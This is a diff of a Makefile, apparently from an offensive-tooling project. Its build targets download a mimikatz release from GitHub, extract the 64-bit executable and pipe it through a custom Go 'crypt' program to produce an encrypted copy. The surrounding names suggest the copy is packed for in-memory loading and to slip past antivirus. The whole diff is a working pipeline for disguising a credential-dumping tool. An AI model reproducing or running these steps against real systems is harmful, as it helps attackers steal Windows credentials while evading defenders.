@@ -23,20 +23,19 @@ MemoryModule:
 
 # Packing the binary
 pack: crypt download
-	./cryp
+	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt > mimi_encrypted
 
 crypt: crypt.go
 	go build crypt.go
 
 download:
-	curl -L https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.7z
-	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt
+	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.7z
 
 
 # Clean target. 
 CLEANDIRS = $(SUBDIRS:%=clean-%)
 clean: $(CLEANDIRS)
-	rm -f crypt mimikatz.exe
+	rm -f crypt mimikatz.exe mimikatz_trunk.7z mimi_encrypted
 $(CLEANDIRS): 
 	$(MAKE) -C $(@:clean-%=%) clean
 
